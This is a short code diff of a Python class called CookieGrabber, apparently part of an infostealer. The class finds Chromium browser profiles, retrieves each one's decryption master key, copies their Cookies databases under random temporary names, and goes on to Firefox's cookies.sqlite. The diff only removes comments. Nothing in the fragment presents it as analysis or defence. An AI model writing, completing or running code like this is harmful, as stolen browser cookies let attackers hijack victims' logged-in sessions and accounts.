@@ -38,13 +38,12 @@ class CookieGrabber:
 
     def run(self):
         cookies = []
-        # Chromium Cookies
         for name, path in self.chromium_targets.items():
             key = self.get_master_key(path)
             if not key: continue
             for profile in ['Default'] + [p.name for p in path.glob("Profile *")]:
                 db = path / profile / "Network" / "Cookies"
-                if not db.exists(): db = path / profile / "Cookies" # Older versions
+                if not db.exists(): db = path / profile / "Cookies"
                 if db.exists():
                     tmp = self.temp / f"c{os.getpid()}{random.randint(1,999)}.db"
                     shutil.copy2(db, tmp)
@@ -55,7 +54,6 @@ class CookieGrabber:
                     conn.close()
                     os.remove(tmp)
 
-        # Firefox Cookies (No decryption needed, stored in plain text or Netscape format)
         ff_path = self.roaming / "Mozilla/Firefox/Profiles"
         for prof in ff_path.glob("*.default*"):
             cookie_db = prof / "cookies.sqlite"
